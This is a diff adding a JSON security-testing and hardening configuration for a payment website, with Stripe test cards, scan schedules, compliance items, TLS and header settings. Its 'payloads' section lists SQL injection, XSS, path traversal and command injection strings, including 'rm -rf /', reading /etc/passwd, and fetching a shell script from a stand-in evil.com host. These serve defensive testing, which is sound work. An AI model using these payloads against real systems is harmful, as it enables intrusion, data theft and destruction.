@@ -1,0 +1,263 @@
+{
+  "security": {
+    "testing": {
+      "enabled": true,
+      "environments": {
+        "development": {
+          "baseUrl": "http://localhost:3000",
+          "skipCriticalTests": false,
+          "allowInsecureConnections": true
+        },
+        "staging": {
+          "baseUrl": "https://staging.jpmarcenaria.com",
+          "skipCriticalTests": false,
+          "allowInsecureConnections": false
+        },
+        "production": {
+          "baseUrl": "https://jpmarcenaria.com",
+          "skipCriticalTests": true,
+          "allowInsecureConnections": false
+        }
+      },
+      "stripe": {
+        "apiVersion": "2023-10-16",
+        "testCards": {
+          "visa": "4242424242424242",
+          "visaDebit": "4000056655665556",
+          "mastercard": "5555555555554444",
+          "amex": "378282246310005",
+          "declined": "4000000000000002",
+          "insufficientFunds": "4000000000009995",
+          "stolen": "4000000000009979"
+        },
+        "webhookTimeout": 30000,
+        "maxRetries": 3
+      },
+      "payloads": {
+        "sqlInjection": [
+          "'; DROP TABLE payments; --",
+          "' OR '1'='1",
+          "'; SELECT * FROM users WHERE '1'='1'; --",
+          "' UNION SELECT creditCardNumber FROM payments --",
+          "'; INSERT INTO admin_users VALUES ('hacker', 'password'); --",
+          "' AND (SELECT COUNT(*) FROM information_schema.tables) > 0 --",
+          "'; WAITFOR DELAY '00:00:05'; --"
+        ],
+        "xss": [
+          "<script>alert('XSS')</script>",
+          "javascript:alert('XSS')",
+          "<img src=x onerror=alert('XSS')>",
+          "';alert('XSS');//",
+          "<svg onload=alert('XSS')>",
+          "<iframe src=javascript:alert('XSS')></iframe>",
+          "<body onload=alert('XSS')>",
+          "<<SCRIPT>alert('XSS')//<</SCRIPT>"
+        ],
+        "commandInjection": [
+          "; ls -la",
+          "| cat /etc/passwd",
+          "&& whoami",
+          "; rm -rf /",
+          "$(curl evil.com)",
+          "`id`",
+          "| nc -l 4444",
+          "; wget http://evil.com/shell.sh"
+        ],
+        "pathTraversal": [
+          "../../../etc/passwd",
+          "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
+          "....//....//....//etc/passwd",
+          "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
+          "..%252f..%252f..%252fetc%252fpasswd"
+        ]
+      }
+    },
+    "monitoring": {
+      "enabled": true,
+      "schedules": {
+        "fullScan": "0 2 * * *",
+        "criticalScan": "0 */6 * * *",
+        "webhookMonitoring": "*/15 * * * *",
+        "performanceCheck": "*/5 * * * *"
+      },
+      "thresholds": {
+        "maxCriticalVulnerabilities": 0,
+        "maxHighVulnerabilities": 2,
+        "maxMediumVulnerabilities": 10,
+        "maxResponseTime": 10000,
+        "minAvailability": 99.9
+      },
+      "notifications": {
+        "email": {
+          "enabled": true,
+          "recipients": [
+            "security@jpmarcenaria.com",
+            "dev@jpmarcenaria.com"
+          ],
+          "smtp": {
+            "host": "smtp.gmail.com",
+            "port": 587,
+            "secure": false
+          }
+        },
+        "slack": {
+          "enabled": false,
+          "webhook": "",
+          "channel": "#security-alerts"
+        },
+        "discord": {
+          "enabled": false,
+          "webhook": ""
+        }
+      }
+    },
+    "compliance": {
+      "pciDss": {
+        "enabled": true,
+        "requirements": [
+          "1.1.1", "1.1.2", "1.1.3", "1.1.4", "1.1.5",
+          "2.1", "2.2", "2.3", "2.4",
+          "3.1", "3.2", "3.3", "3.4", "3.5", "3.6",
+          "4.1", "4.2", "4.3",
+          "6.1", "6.2", "6.3", "6.4", "6.5",
+          "8.1", "8.2", "8.3", "8.4", "8.5",
+          "10.1", "10.2", "10.3", "10.4", "10.5",
+          "11.1", "11.2", "11.3", "11.4",
+          "12.1", "12.2", "12.3", "12.4"
+        ]
+      },
+      "gdpr": {
+        "enabled": true,
+        "dataTypes": [
+          "personal_identification",
+          "financial_information",
+          "payment_data",
+          "contact_information"
+        ]
+      },
+      "lgpd": {
+        "enabled": true,
+        "dataProcessingBasis": [
+          "consent",
+          "contract_execution",
+          "legal_obligation"
+        ]
+      }
+    },
+    "reporting": {
+      "formats": ["json", "html", "pdf"],
+      "includeEvidence": true,
+      "cvssVersion": "3.1",
+      "severityMapping": {
+        "CRITICAL": {
+          "cvssRange": [9.0, 10.0],
+          "color": "#dc2626",
+          "priority": 1
+        },
+        "HIGH": {
+          "cvssRange": [7.0, 8.9],
+          "color": "#f59e0b",
+          "priority": 2
+        },
+        "MEDIUM": {
+          "cvssRange": [4.0, 6.9],
+          "color": "#3b82f6",
+          "priority": 3
+        },
+        "LOW": {
+          "cvssRange": [0.1, 3.9],
+          "color": "#10b981",
+          "priority": 4
+        }
+      },
+      "retention": {
+        "days": 365,
+        "maxReports": 1000
+      }
+    },
+    "authentication": {
+      "jwt": {
+        "algorithm": "HS256",
+        "expirationTime": "1h",
+        "issuer": "jp-marcenaria-digital",
+        "audience": "payment-system"
+      },
+      "session": {
+        "timeout": 1800,
+        "renewalThreshold": 300,
+        "maxConcurrentSessions": 3
+      },
+      "passwordPolicy": {
+        "minLength": 12,
+        "requireUppercase": true,
+        "requireLowercase": true,
+        "requireNumbers": true,
+        "requireSpecialChars": true,
+        "maxAge": 90,
+        "historyCount": 12
+      }
+    },
+    "encryption": {
+      "algorithms": {
+        "symmetric": "AES-256-GCM",
+        "asymmetric": "RSA-4096",
+        "hashing": "SHA-256"
+      },
+      "keyManagement": {
+        "rotationInterval": 90,
+        "backupCount": 3,
+        "escrowRequired": true
+      }
+    },
+    "network": {
+      "tls": {
+        "minVersion": "1.2",
+        "preferredVersion": "1.3",
+        "cipherSuites": [
+          "TLS_AES_256_GCM_SHA384",
+          "TLS_CHACHA20_POLY1305_SHA256",
+          "TLS_AES_128_GCM_SHA256"
+        ]
+      },
+      "headers": {
+        "required": [
+          "Strict-Transport-Security",
+          "X-Content-Type-Options",
+          "X-Frame-Options",
+          "X-XSS-Protection",
+          "Content-Security-Policy",
+          "Referrer-Policy"
+        ],
+        "values": {
+          "Strict-Transport-Security": "max-age=31536000; includeSubDomains; preload",
+          "X-Content-Type-Options": "nosniff",
+          "X-Frame-Options": "DENY",
+          "X-XSS-Protection": "1; mode=block",
+          "Content-Security-Policy": "default-src 'self'; script-src 'self' 'unsafe-inline' https://js.stripe.com; style-src 'self' 'unsafe-inline'; img-src 'self' data: https:; connect-src 'self' https://api.stripe.com;",
+          "Referrer-Policy": "strict-origin-when-cross-origin"
+        }
+      }
+    },
+    "logging": {
+      "level": "info",
+      "sensitiveFields": [
+        "password",
+        "credit_card",
+        "ssn",
+        "token",
+        "secret",
+        "key"
+      ],
+      "retention": {
+        "security": 365,
+        "audit": 2555,
+        "debug": 30
+      },
+      "destinations": [
+        "file",
+        "syslog",
+        "elasticsearch"
+      ]
+    }
+  }
+}
